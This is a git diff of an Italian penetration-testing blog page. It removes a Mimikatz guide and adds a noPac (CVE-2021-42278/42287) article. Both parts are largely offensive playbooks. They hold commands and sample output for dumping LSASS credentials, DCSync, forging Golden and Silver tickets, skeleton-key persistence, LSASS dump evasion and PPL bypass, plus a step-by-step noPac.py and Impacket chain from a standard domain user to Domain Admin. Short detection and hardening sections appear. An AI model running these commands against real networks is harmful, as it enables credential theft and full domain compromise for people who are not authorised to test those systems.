@@ -1,699 +1,269 @@
 ---
-title: 'Mimikatz: Dump Credenziali, DCSync e Golden Ticket in Active Directory'
-slug: mimikatz
-description: >-
-  Guida tecnica a Mimikatz: come estrarre password da LSASS, eseguire DCSync e
-  creare Golden Ticket in ambienti Active Directory. Focus offensivo, comandi
-  pratici e varianti evasive.
-image: '/ChatGPT Image Feb 13, 2026, 01_16_48 AM.webp'
-draft: false
-date: 2026-02-14T00:00:00.000Z
+title: 'noPac Active Directory: exploit da utente standard a Domain Admin'
+slug: nopac
+description: 'noPac su Active Directory: sfrutta CVE-2021-42278 e CVE-2021-42287 per impersonare un Domain Controller, fare DCSync e ottenere Domain Admin'
+image: /file_00000000b52072438e3782606fa644e1.webp
+draft: true
+date: 2026-03-03T00:00:00.000Z
 categories:
-  - windows
+  - cve
 subcategories:
-  - active-directory
+  - high
 tags:
-  - privesc-windows
-  - kerberos
+  - 'CVE Windows '
 featured: true
 ---
 
-> **Executive Summary** — Mimikatz è il tool di credential extraction più importante nella storia del penetration testing Windows. Creato da Benjamin Delpy nel 2011, è diventato lo strumento standard per estrarre password in chiaro, hash NTLM, ticket Kerberos e certificati dalla memoria dei sistemi Windows. In un engagement Active Directory, Mimikatz è coinvolto in quasi ogni fase: dal primo credential dump sulla workstation al [DCSync](https://hackita.it/articoli/dcsync) sul Domain Controller, dal Pass-the-Hash al Golden Ticket. Questo articolo copre ogni modulo con comandi operativi, output commentati e contesto di utilizzo.
+noPac è una delle catene di privilege escalation più pericolose mai viste in [Active Directory](https://hackita.it/articoli/active-directory). Combina **CVE-2021-42278** e **CVE-2021-42287** per far sì che il KDC tratti un machine account controllato dall'attaccante come se fosse il Domain Controller reale.
 
-**TL;DR**
+Il risultato operativo è diretto: **impersonation del DC → [DCSync](https://hackita.it/articoli/dcsync) → compromissione del dominio**.
 
-* `sekurlsa::logonpasswords` estrae password in chiaro e hash NTLM dalla memoria LSASS — il comando più usato
-* `lsadump::dcsync` replica il database Active Directory dal Domain Controller senza accesso fisico al DC
-* `kerberos::golden` crea un Golden Ticket per ottenere persistenza quasi illimitata nel dominio
-
-## Perché Mimikatz è Ancora Rilevante nel 2026
-
-Dopo 15 anni, Mimikatz resta fondamentale per tre ragioni:
-
-1. **LSASS contiene ancora credenziali**: Windows caches credenziali in memoria per SSO. Finché questo design esiste, Mimikatz funziona
-2. **Active Directory dipende da NTLM e Kerberos**: entrambi i protocolli sono sfruttabili con gli hash e le chiavi che Mimikatz estrae
-3. **Nessun sostituto completo**: altri tool (SharpKatz, Rubeus, nanodump) coprono parti di Mimikatz, ma nessuno ha la completezza dell'originale
-
-Il rilevamento è migliorato enormemente (EDR, Credential Guard, PPL), ma le tecniche di evasione si sono evolute di pari passo. Mimikatz è il fondamento — anche quando usi alternative, devi capire cosa fa Mimikatz per capire cosa fanno loro.
-
-## 1. Prerequisiti e Avvio
-
-### Cosa serve
-
-```
-- Accesso a un sistema Windows (shell, RDP, WinRM)
-- Privilegi di amministratore locale (per la maggior parte dei moduli)
-- Privilege SeDebugPrivilege (per accedere alla memoria LSASS)
-- Mimikatz binary o variante (vedi sezione Evasion)
-```
-
-### Avvio
-
-```
-mimikatz.exe
-
-  .#####.   mimikatz 2.2.0 (x64) #19041
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'
-  '#####'
-
-mimikatz #
-```
-
-### Privilegi necessari
-
-```
-mimikatz # privilege::debug
-```
-
-```
-Privilege '20' OK
-```
-
-Se ottieni `ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061` → non sei Administrator o Credential Guard è attivo.
-
-### Eleva a SYSTEM
-
-```
-mimikatz # token::elevate
-```
-
-```
-Token Id  : 0
-User name : NT AUTHORITY\SYSTEM
-```
-
-## 2. sekurlsa — Extraction Credenziali dalla Memoria
-
-Il modulo più usato. Legge il processo LSASS (Local Security Authority Subsystem Service) che contiene le credenziali di tutti gli utenti che hanno effettuato il login.
-
-### sekurlsa::logonpasswords — Il Comando d'Oro
-
-```
-mimikatz # sekurlsa::logonpasswords
-```
-
-**Output:**
-
-```
-Authentication Id : 0 ; 12345678 (00000000:00bc614e)
-Session           : Interactive from 1
-User Name         : j.smith
-Domain            : CORP
-Logon Server      : DC01
-Logon Time        : 1/15/2026 10:00:00 AM
-SID               : S-1-5-21-1234567890-1234567890-1234567890-1103
-
-        msv :
-         [00000003] Primary
-         * Username : j.smith
-         * Domain   : CORP
-         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
-         * SHA1     : a4f49c406510bdcab6824ee7c30fd852d123456
-
-        tspkg :
-         * Username : j.smith
-         * Domain   : CORP
-         * Password : Summer2026!
-
-        wdigest :
-         * Username : j.smith
-         * Domain   : CORP
-         * Password : Summer2026!
-
-        kerberos :
-         * Username : j.smith
-         * Domain   : CORP.LOCAL
-         * Password : Summer2026!
-
-        credman :
-         [00000000]
-         * Username : admin@10.10.10.50
-         * Password : AdminP@ss!
-
-Authentication Id : 0 ; 23456789
-Session           : Service from 0
-User Name         : svc_sql
-Domain            : CORP
-        msv :
-         * Username : svc_sql
-         * Domain   : CORP
-         * NTLM     : a87f3a337d73085c45f9416be5787d86
-
-        kerberos :
-         * Username : svc_sql
-         * Domain   : CORP.LOCAL
-         * Password : SqlS3rvice2025!
-```
-
-**Lettura dell'output — cosa hai ottenuto:**
-
-**j.smith:**
-
-* **Hash NTLM**: `64f12cddaa88057e06a81b54e73b949b` → [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) verso qualsiasi servizio
-* **Password in chiaro**: `Summer2026!` (da tspkg/wdigest/kerberos) → login diretto ovunque
-* **Credential Manager**: `admin@10.10.10.50 / AdminP@ss!` → credenziali salvate per un altro server
-
-**svc\_sql:**
-
-* **Hash NTLM**: `a87f3a337d73085c45f9416be5787d86` → PtH verso SQL server
-* **Password**: `SqlS3rvice2025!` → login diretto su [MSSQL](https://hackita.it/articoli/mssql)
-
-**Nota sulle password in chiaro:**
-
-* **WDigest**: disabilitato di default da Windows 8.1+ / Server 2012 R2+ (`UseLogonCredential` reg key). Su sistemi vecchi o con la chiave abilitata → password in chiaro
-* **CredMan**: credenziali salvate dall'utente (RDP, share, browser) — spesso le più preziose
-
-### sekurlsa::msv — Solo hash MSV
-
-```
-mimikatz # sekurlsa::msv
-```
-
-Più veloce di `logonpasswords` — solo hash NTLM.
-
-### sekurlsa::ekeys — Chiavi di encryption Kerberos
-
-```
-mimikatz # sekurlsa::ekeys
-```
-
-```
-* Username : j.smith
-  * aes256_hmac: b7268f45a1b2c3d4e5f6789...
-  * aes128_hmac: 9a3e21cd1234abcd...
-  * rc4_hmac_nt: 64f12cddaa88057e06a81b54e73b949b
-```
-
-Le chiavi AES servono per Golden/Silver Ticket stealth (evita detection "encryption downgrade").
-
-### sekurlsa::tickets — Ticket Kerberos in memoria
-
-```
-mimikatz # sekurlsa::tickets /export
-```
-
-```
-[00000000] - 0x00000012 - aes256_hmac
-   Server Name : krbtgt/CORP.LOCAL @ CORP.LOCAL
-   Client Name : j.smith @ CORP.LOCAL
-   -> Ticket saved to: [0;12345]-2-0-40e10000-j.smith@krbtgt-CORP.LOCAL.kirbi
-```
-
-TGT esportato come `.kirbi` → iniettabile su un'altra macchina con `kerberos::ptt`.
-
-### sekurlsa::pth — Pass-the-Hash
-
-```
-mimikatz # sekurlsa::pth /user:j.smith /domain:corp.local /ntlm:64f12cddaa88057e06a81b54e73b949b
-```
-
-```
-program : cmd.exe
-NTLM    : 64f12cddaa88057e06a81b54e73b949b
-  |  PID  1234
-  \_ cmd.exe (1234)
-```
-
-Apre `cmd.exe` che opera come j.smith via hash. Qualsiasi connessione SMB/LDAP/HTTP Negotiate usa l'hash.
-
-**Da Linux (Impacket):**
-
-```bash
-psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b corp.local/j.smith@10.10.10.50
-```
-
-```bash
-evil-winrm -i 10.10.10.50 -u j.smith -H 64f12cddaa88057e06a81b54e73b949b
-```
-
-```bash
-nxc smb 10.10.10.0/24 -u j.smith -H 64f12cddaa88057e06a81b54e73b949b
-```
-
-## 3. lsadump — Database Locale e Dominio
-
-### lsadump::sam — Hash SAM locali
-
-```
-mimikatz # lsadump::sam
-```
-
-```
-RID  : 000001f4 (500)
-User : Administrator
-  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4
-
-RID  : 000003e9 (1001)
-User : localadmin
-  Hash NTLM: 7facdc498ed1680c4fd1448319a8c04f
-```
-
-Hash locali — l'Administrator locale è spesso lo stesso su più macchine (image cloning). Spray:
-
-```bash
-nxc smb 10.10.10.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba -d . --local-auth
-```
-
-Leggi la guida completa per [nxc](https://hackita.it/articoli/netexec/),scopri nuove tecniche utili nei tuoi CTF!
-
-### lsadump::secrets — LSA Secrets
-
-```
-mimikatz # lsadump::secrets
-```
-
-```
-Secret  : _SC_MSSQLSERVER
-cur/text: SqlS3rvice2025!
-
-Secret  : DefaultPassword
-cur/text: AutoLogonP@ss!
-
-Secret  : $MACHINE.ACC
-cur/NTLM: ab12cd34ef56789...
-```
-
-* **`_SC_` prefix**: password dei servizi Windows (SQL, IIS, Exchange)
-* **DefaultPassword**: credenziali auto-logon
-* **$MACHINE.ACC**: hash dell'account computer
-
-### lsadump::cache — Cached Domain Credentials
-
-```
-mimikatz # lsadump::cache
-```
-
-```
-[NL$1 - 1/15/2026]
-User      : CORP\admin
-MsCacheV2 : $DCC2$10240#admin#hash...
-```
-
-Crackabili con [hashcat](https://hackita.it/articoli/hashcat) mode 2100 — molto più lente di NTLM.
-
-### lsadump::dcsync — Il Comando più Potente
-
-Replica il database AD dal DC. Per la guida completa: [DCSync](https://hackita.it/articoli/dcsync).
-
-```
-mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
-```
-
-```
-SAM Username : Administrator
-Hash NTLM    : 32ed87bdb5fdc5e9cba88547376818d4
-aes256_hmac  : b7268f45a1b2c3d4e5f6789...
-```
-
-```
-mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
-```
-
-L'hash di `krbtgt` è la chiave per il Golden Ticket.
-
-```
-mimikatz # lsadump::dcsync /domain:corp.local /all /csv
-```
-
-Tutti gli hash del dominio in una riga.
-
-**Da Linux (Impacket — equivalente):**
-
-```bash
-secretsdump.py corp.local/Administrator:'P@ssw0rd'@DC01 -just-dc
-```
-
-### lsadump::trust — Chiavi di trust
-
-```
-mimikatz # lsadump::trust /patch
-```
-
-```
-Domain: PARTNER.LOCAL
- [ Out ] CORP.LOCAL -> PARTNER.LOCAL
-    * rc4_hmac_nt: trust_key_ntlm...
-```
-
-Chiavi per attacchi cross-forest.
-
-## 4. kerberos — Ticket Forging
-
-### kerberos::golden — Golden Ticket
-
-```
-mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /ptt
-```
-
-```
-Golden ticket for 'fakeadmin @ corp.local' successfully submitted for current session
-```
-
-Parametri:
-
-* `/user:fakeadmin` — qualsiasi nome, anche inesistente
-* `/sid:S-1-5-21-...` — SID del dominio
-* `/krbtgt:hash` — hash NTLM di krbtgt (dal DCSync)
-* `/ptt` — inietta in memoria
-
-**Con AES256 (evita detection downgrade):**
-
-```
-mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /aes256:a1b2c3d4e5f6789... /ptt
-```
-
-Dopo il Golden Ticket:
-
-```
-dir \\DC01\c$
-psexec \\DC01 cmd
-```
-
-**Da Linux:**
-
-```bash
-ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-... -domain corp.local fakeadmin
-export KRB5CCNAME=fakeadmin.ccache
-psexec.py -k -no-pass corp.local/fakeadmin@DC01.corp.local
-```
-
-**Durata:** valido finché `krbtgt` non cambia **due volte**. Spesso = anni.
-
-### kerberos::silver — Silver Ticket
-
-TGS forgiato per un singolo servizio — invisibile al DC.
-
-```
-mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:a87f3a337d73085c45f9416be5787d86 /ptt
-```
-
-Accesso a [MSSQL](https://hackita.it/articoli/mssql) su sql01 senza contattare il DC.
-
-### kerberos::ptt — Pass-the-Ticket
-
-```
-mimikatz # kerberos::ptt ticket.kirbi
-```
-
-### kerberos::list e purge
-
-```
-mimikatz # kerberos::list
-```
-
-```
-mimikatz # kerberos::purge
-```
-
-## 5. dpapi — Credenziali Salvate
-
-### Chrome passwords
-
-```
-mimikatz # dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
-```
-
-```
-URL      : https://corp.local/login
-Username : admin@corp.local
-Password : CorpAdmin2026!
-```
-
-### Credential Manager
-
-```
-mimikatz # vault::cred
-```
-
-```
-TargetName : Domain:target=RDP/10.10.10.50
-User       : admin
-Password   : RDP_Admin_P@ss!
-```
-
-### Domain DPAPI Backup Key (se DA)
-
-```
-mimikatz # lsadump::backupkeys /system:DC01.corp.local /export
-```
-
-Con questa chiave decripti le credenziali DPAPI di TUTTI gli utenti del dominio — offline.
-
-## 6. misc — Persistence e Utility
-
-### misc::skeleton — Skeleton Key
-
-```
-mimikatz # misc::skeleton
-```
-
-```
-[KDC] service patched
-```
-
-Dopo: qualsiasi utente del dominio accetta la password `mimikatz` oltre alla password reale. Solo in memoria — scompare al riavvio.
-
-### misc::memssp — Password Logger
-
-```
-mimikatz # misc::memssp
-```
-
-Ogni login successivo viene loggato con password in chiaro in `C:\Windows\System32\mimilsa.log`.
-
-## 7. token — Impersonation
-
-```
-mimikatz # token::elevate
-```
-
-Impersona SYSTEM.
-
-```
-mimikatz # token::elevate /domainadmin
-```
-
-Cerca e impersona un token DA se presente in memoria.
-
-## 8. Evasion — Bypassare le Detection
-
-### Alternative a Mimikatz
-
-| Tool                                                           | Funzione                             | Vantaggio                     |
-| -------------------------------------------------------------- | ------------------------------------ | ----------------------------- |
-| **[SharpKatz](https://hackita.it/articoli/sharpkatz/)**        | Port .NET di Mimikatz                | Meno signature                |
-| **[SafetyKatz](https://hackita.it/articoli/safetykatz/)**      | Mimikatz offuscato .NET              | Evasion migliorata            |
-| **[nanodump](https://hackita.it/articoli/nanodump/)**          | Dump LSASS minimalista               | Molto piccolo, poca detection |
-| **[Rubeus](https://hackita.it/articoli/rubeus/)**              | Solo Kerberos (ask, renew, ptt, s4u) | Specializzato, meno detection |
-| **[secretsdump.py](https://hackita.it/articoli/secretsdump/)** | DCSync da Linux                      | Non tocca il target Windows   |
-| **[pypykatz](https://hackita.it/articoli/pykatz/)**            | Mimikatz in Python                   | Analisi offline di dump LSASS |
-| **[lsassy](https://hackita.it/articoli/lsassy/)**              | Dump LSASS remoto via SMB            | Da Linux, una riga            |
-
-### Dump LSASS senza Mimikatz
-
-**Task Manager (GUI):**
-
-```
-Task Manager → Details → lsass.exe → Create dump file
-```
-
-Trasferisci il dump e analizza:
-
-```bash
-pypykatz lsa minidump lsass.DMP
-```
-
-**comsvcs.dll (LoLBin — nessun tool esterno):**
-
-```
-# Trova PID di LSASS
-tasklist /fi "imagename eq lsass.exe"
-```
-
-```
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\temp\lsass.dmp full
-```
-
-**ProcDump (tool Microsoft legittimo):**
-
-```
-procdump.exe -accepteula -ma lsass.exe lsass.dmp
-```
-
-**nanodump:**
-
-```
-nanodump.exe --write C:\temp\lsass.dmp
-```
-
-**lsassy (da Linux via SMB — tutto in un comando):**
-
-```bash
-lsassy -u admin -H HASH 10.10.10.40
-```
-
-```
-CORP\j.smith  64f12cddaa88057e06a81b54e73b949b  Summer2026!
-CORP\svc_sql  a87f3a337d73085c45f9416be5787d86  SqlS3rvice2025!
-```
-
-### Credential Guard bypass
-
-Credential Guard isola LSASS in Virtual Secure Mode. Mimikatz non legge la memoria protetta. Ma:
-
-```
-NON protetto da Credential Guard:
-- Kerberos ticket in cache
-- DPAPI keys
-- Cached credentials (DCC2)
-- Credential Manager
-- DCSync (non dipende da LSASS)
-```
-
-### PPL (Protected Process Light) bypass
-
-```
-mimikatz # !+
-mimikatz # !processprotect /process:lsass.exe /remove
-mimikatz # sekurlsa::logonpasswords
-```
-
-Richiede il driver `mimidrv.sys` firmato.
-
-## 9. Scenari Completi
-
-### Workstation → DA → Dominio
-
-```
-Shell su workstation (exploit/phishing)
-→ privilege::debug
-→ sekurlsa::logonpasswords → hash j.smith
-→ nxc smb rete -u j.smith -H HASH → trova server con admin
-→ psexec sul server → Mimikatz → hash Domain Admin
-→ lsadump::dcsync /user:krbtgt → Golden Ticket
-→ Dominio completo
-```
-
-### LSASS dump offline (stealth)
-
-```
-comsvcs.dll dump su target → trasferisci .dmp
-→ pypykatz lsa minidump lsass.dmp → hash + password
-→ Nessun Mimikatz.exe toccato sul target → meno detection
-```
-
-### DCSync completo da Linux
-
-```
-secretsdump.py corp/DA:pass@DC01 -just-dc
-→ Tutti gli hash → ticketer.py Golden Ticket
-→ psexec.py -k -no-pass → shell su qualsiasi macchina
-```
-
-Per il workflow DCSync dettagliato: [guida DCSync](https://hackita.it/articoli/dcsync).
-
-## 10. Detection
-
-| Indicatore    | Event ID        | Descrizione                                |
-| ------------- | --------------- | ------------------------------------------ |
-| LSASS access  | **Sysmon 10**   | Process access a LSASS                     |
-| DCSync        | **4662**        | DS replication da non-DC (GUID di replica) |
-| Golden Ticket | **4769**        | TGS con encryption downgrade (RC4)         |
-| Skeleton Key  | **System**      | Modifica servizio KDC                      |
-| PtH           | **4624** Type 9 | NewCredentials logon                       |
-
-## 11. Cheat Sheet Finale
-
-### Credential Extraction
-
-| Azione           | Comando                               |
-| ---------------- | ------------------------------------- |
-| Debug privilege  | `privilege::debug`                    |
-| Elevate SYSTEM   | `token::elevate`                      |
-| Password + hash  | `sekurlsa::logonpasswords`            |
-| Solo hash MSV    | `sekurlsa::msv`                       |
-| Chiavi Kerberos  | `sekurlsa::ekeys`                     |
-| SAM locale       | `lsadump::sam`                        |
-| LSA Secrets      | `lsadump::secrets`                    |
-| Cached creds     | `lsadump::cache`                      |
-| Chrome passwords | `dpapi::chrome /in:[path] /unprotect` |
-| Credential Vault | `vault::cred`                         |
-
-### Active Directory
-
-| Azione        | Comando                                                  |
-| ------------- | -------------------------------------------------------- |
-| DCSync utente | `lsadump::dcsync /domain:corp.local /user:Administrator` |
-| DCSync krbtgt | `lsadump::dcsync /domain:corp.local /user:krbtgt`        |
-| DCSync all    | `lsadump::dcsync /domain:corp.local /all /csv`           |
-| Trust keys    | `lsadump::trust /patch`                                  |
-| DPAPI backup  | `lsadump::backupkeys /system:DC01 /export`               |
-
-### [Kerberos](https://hackita.it/articoli/kerberos)
-
-| Azione          | Comando                                                                                     |
-| --------------- | ------------------------------------------------------------------------------------------- |
-| Golden Ticket   | `kerberos::golden /user:fake /domain:corp /sid:SID /krbtgt:HASH /ptt`                       |
-| Golden AES      | `kerberos::golden /user:fake /domain:corp /sid:SID /aes256:KEY /ptt`                        |
-| Silver Ticket   | `kerberos::golden /user:fake /domain:corp /sid:SID /target:SRV /service:SPN /rc4:HASH /ptt` |
-| Pass-the-Ticket | `kerberos::ptt ticket.kirbi`                                                                |
-| Export tickets  | `sekurlsa::tickets /export`                                                                 |
-| Purge           | `kerberos::purge`                                                                           |
-
-### Pass-the-Hash
-
-| Tool       | Comando                                             |
-| ---------- | --------------------------------------------------- |
-| Mimikatz   | `sekurlsa::pth /user:admin /domain:corp /ntlm:HASH` |
-| psexec.py  | `psexec.py -hashes :HASH corp/admin@target`         |
-| wmiexec.py | `wmiexec.py -hashes :HASH corp/admin@target`        |
-| evil-winrm | `evil-winrm -i target -u admin -H HASH`             |
-| CME        | `cme smb target -u admin -H HASH`                   |
-
-### Persistence
-
-| Tecnica       | Comando                     |
-| ------------- | --------------------------- |
-| Skeleton Key  | `misc::skeleton`            |
-| SSP Logger    | `misc::memssp`              |
-| Golden Ticket | `kerberos::golden ... /ptt` |
-
-### Evasion
-
-| Metodo           | Tool                                  |
-| ---------------- | ------------------------------------- |
-| Dump LSASS (Win) | `comsvcs.dll`, `procdump`, `nanodump` |
-| Analisi offline  | `pypykatz lsa minidump lsass.dmp`     |
-| Dump remoto      | `lsassy -u admin -H HASH target`      |
-| DCSync Linux     | `secretsdump.py corp/admin:pass@DC`   |
-| Kerberos Win     | `Rubeus.exe`                          |
-| Kerberos Linux   | `ticketer.py`, `GetUserSPNs.py`       |
-
-### Hardening
-
-* **Credential Guard** abilitato (protegge LSASS in VSM)
-* **LSASS PPL** abilitato (Protected Process Light)
-* **WDigest disabilitato** (default da Win 8.1+ ma verifica)
-* **Protected Users group** per admin (no caching, no NTLM, no delegation)
-* **Ruota krbtgt** periodicamente (due volte per invalidare Golden Ticket)
-* **Tier model**: DA usato solo su DC, mai su workstation
-* **LAPS/gMSA** per account locali e di servizio
-* **Monitoraggio**: Sysmon Event 10 su LSASS, Event 4662 per DCSync
+In un contesto offensivo reale, noPac è uno dei controlli più redditizi da provare appena ottieni credenziali valide. Se il dominio è vulnerabile, la catena **[password spraying](https://hackita.it/articoli/password-spraying) → noPac → DCSync** può trasformare un accesso basso in privilegio massimo in pochissimo tempo.
 
 ***
 
-Riferimento: Benjamin Delpy (gentilkiwi), SpecterOps, harmj0y, Microsoft Security. Uso esclusivo in ambienti autorizzati.
+## ⚡ Perché noPac È Così Critico
 
-👉 Supporta il progetto su **[https://hackita.it/supporto](https://hackita.it/supporto)**
-👉 Richiedi consulenza o simulazioni aziendali su **[https://hackita.it/servizi](https://hackita.it/servizi)**
+| Caratteristica                   | Impatto                                              |
+| -------------------------------- | ---------------------------------------------------- |
+| **Auth richiesta**               | Solo un utente di dominio autenticato                |
+| **Vettore d'attacco**            | Errore logico nel flusso Kerberos/KDC                |
+| **Obiettivo finale**             | [DCSync](https://hackita.it/articoli/dcsync) diretto |
+| **Rapporto impatto/complessità** | Altissimo                                            |
+
+A differenza di altre escalation più lunghe, qui non ti serve una catena complessa di ACL, delegation abuse o movimento laterale preliminare: se i prerequisiti sono presenti, l'exploit è rapido e molto efficace.
 
 ***
 
-**Link esterni utili (autorevoli):**
+## 📊 noPac 80/20
 
-* [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
-* [https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
-* [https://attack.mitre.org/techniques/T1003/](https://attack.mitre.org/techniques/T1003/)
+| Elemento           | Dettaglio                                                                                                                                                                       |
+| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **CVE**            | [CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) + [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) |
+| **Auth richiesta** | Qualsiasi utente di dominio                                                                                                                                                     |
+| **Prerequisito**   | `MachineAccountQuota > 0` oppure un machine account già controllato                                                                                                             |
+| **Impatto**        | Impersonation del DC → [DCSync](https://hackita.it/articoli/dcsync)                                                                                                             |
+| **Difficoltà**     | Bassa con exploit automatico                                                                                                                                                    |
+| **Patch**          | Novembre 2021                                                                                                                                                                   |
+
+***
+
+## 🗺️ Attack Path noPac
+
+```
+
+Utente di dominio → Crea machine account → Rinomina il machine account → Confusione nel KDC → Impersona il DC → DCSync → Domain Admin
+
+```
+
+Questa è la forza di noPac: una catena corta, chiara e con impatto immediato.
+
+***
+
+## 🧠 Cos'è noPac
+
+noPac nasce dalla combinazione di due vulnerabilità:
+
+* **[CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)**: permette di rinominare un machine account in modo pericoloso, rimuovendo il `$`
+* **[CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)**: il KDC gestisce male la risoluzione del principal e può fare fallback sull'account del Domain Controller reale
+
+In pratica, l'attaccante crea o controlla un computer account, lo rinomina strategicamente e sfrutta il comportamento di Kerberos per ottenere ticket che aprono la strada all'impersonation del DC.
+
+***
+
+## ✅ Quando Funziona
+
+noPac funziona quando:
+
+* I Domain Controller **non sono patchati** (patch di novembre 2021 assente)
+* `MachineAccountQuota` è maggiore di 0
+* L'attaccante ha **credenziali valide** di un utente di dominio
+* Il dominio consente ancora la creazione di computer account da parte di utenti normali
+
+> 💡 **Nota bene**: Se il dominio è aggiornato e hardenizzato correttamente, la catena si interrompe.
+
+***
+
+## 🔍 Come Verificare Se Il Dominio È Attaccabile
+
+Il primo controllo utile è verificare il valore di `MachineAccountQuota`.
+
+```bash
+netexec ldap DC_IP -u user -p Password123 -M maq
+```
+
+Se il valore è maggiore di zero, un utente di dominio standard può normalmente creare un nuovo computer account. Questo rende la catena molto più semplice da eseguire.
+
+Segnali utili:
+
+· ✅ Credenziali di dominio valide già ottenute
+· ✅ Ambiente legacy o poco aggiornato
+· ✅ Possibilità di aggiungere oggetti computer
+· ✅ Nessun hardening evidente lato Kerberos
+
+***
+
+⚙️ Exploit Rapido Con noPac.py
+
+Per una validazione veloce, il metodo più pratico è usare noPac.py.
+
+🔎 Scan
+
+```bash
+python3 noPac.py corp.local/user:Password123 -dc-ip DC_IP -dc-host DC_HOSTNAME --scan
+```
+
+La modalità --scan ti permette di capire se il target è promettente senza andare subito sulla parte più invasiva.
+
+💥 Exploit
+
+```bash
+python3 noPac.py corp.local/user:Password123 -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -dump
+```
+
+Con --impersonate administrator -dump, la catena viene automatizzata: impersonation e tentativo di dump tramite DCSync.
+
+***
+
+## 🛠️ Exploit Manuale Con Impacket
+
+L'exploit automatico è il più veloce. L'approccio manuale con **[Impacket](https://github.com/fortra/impacket)** è quello migliore per capire davvero la tecnica e fare troubleshooting.
+
+### 📦 Passaggi Dettagliati
+
+| Fase                                | Comando                                                                                                                                           | Tool                                                                                      |
+| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
+| **1. Crea un machine account**      | `impacket-addcomputer corp.local/user:Password123 -computer-name 'NOPAC$' -computer-pass 'FakePass' -dc-ip DC_IP`                                 | [addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)     |
+| **2. Rinominalo senza `$`**         | `impacket-renameMachine corp.local/user:Password123 -current-name 'NOPAC$' -new-name 'DC_NAME' -dc-ip DC_IP`                                      | [renameMachine](https://github.com/fortra/impacket/blob/master/examples/renameMachine.py) |
+| **3. Richiedi un TGT**              | `impacket-getTGT corp.local/'DC_NAME':'FakePass' -dc-ip DC_IP`                                                                                    | [getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)               |
+| **4. Ripristina il nome originale** | `impacket-renameMachine corp.local/user:Password123 -current-name 'DC_NAME' -new-name 'NOPAC$' -dc-ip DC_IP`                                      | [renameMachine](https://github.com/fortra/impacket/blob/master/examples/renameMachine.py) |
+| **5. Richiedi service ticket**      | `impacket-getST corp.local/'DC_NAME$' -spn cifs/DC.corp.local -impersonate administrator -dc-ip DC_IP -k -no-pass`                                | [getST](https://github.com/fortra/impacket/blob/master/examples/getST.py)                 |
+| **6. Esegui DCSync**                | `export KRB5CCNAME=administrator@cifs_DC.corp.local@CORP.LOCAL.ccache && impacket-secretsdump corp.local/administrator@DC.corp.local -k -no-pass` | [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)     |
+
+Se la catena va a buon fine, hai un impatto critico sul dominio partendo da un utente standard.
+
+***
+
+## 🧰 Tool Correlati (Impacket)
+
+Oltre ai tool usati nell'exploit, ecco altri strumenti di **[Impacket](https://github.com/fortra/impacket)** che potrebbero esserti utili in fase di enumerazione e post-exploit:
+
+| Tool                                                               | Descrizione                                                                 |
+| ------------------------------------------------------------------ | --------------------------------------------------------------------------- |
+| **[GetADUsers](https://hackita.it/articoli/getadusers)**           | Enumera utenti dal dominio                                                  |
+| **[GetADComputers](https://hackita.it/articoli/getadcomputers)**   | Recupera informazioni sui computer                                          |
+| **[GetNPUsers](https://hackita.it/articoli/getnpusers)**           | Cerca utenti con Kerberos pre-autenticazione disabilitata (AS-REP Roasting) |
+| **[GetLAPSPassword](https://hackita.it/articoli/getlapspassword)** | Estrae password LAPS da LDAP                                                |
+| **[samrdump](https://hackita.it/articoli/samrdump)**               | Dump degli account SAM                                                      |
+| **[rpcdump](https://hackita.it/articoli/rpcdump)**                 | Enumera endpoint RPC                                                        |
+| **[ntlmrelayx](https://hackita.it/articoli/ntlmrelayx)**           | Strumento avanzato per NTLM relay                                           |
+
+***
+
+## ⚠️ Errori Comuni
+
+* ❌ Non verificare `MachineAccountQuota` prima di partire
+* ❌ Lanciare subito l'exploit senza `--scan`
+* ❌ Non ripristinare il machine account nel flow manuale
+* ❌ Pensare che basti sempre "qualsiasi utente" anche su domini patchati
+* ❌ Usare solo la versione automatica senza capire il meccanismo
+
+***
+
+## 🌍 Contesto Reale
+
+Nel 2026, noPac è raro negli ambienti enterprise ben gestiti, ma resta ancora presente in:
+
+* 🏚️ Infrastrutture legacy
+* 🧪 Lab AD vulnerabili
+* 📉 Domini trascurati o aggiornati male
+
+Come ZeroLogon e PrintNightmare, non è il bug che trovi ovunque — ma quando lo trovi, il valore offensivo è altissimo.
+
+###### La catena più comune resta:&#xA;Password-spray → noPac → DCSync
+
+***
+
+## ✅ Checklist Operativa
+
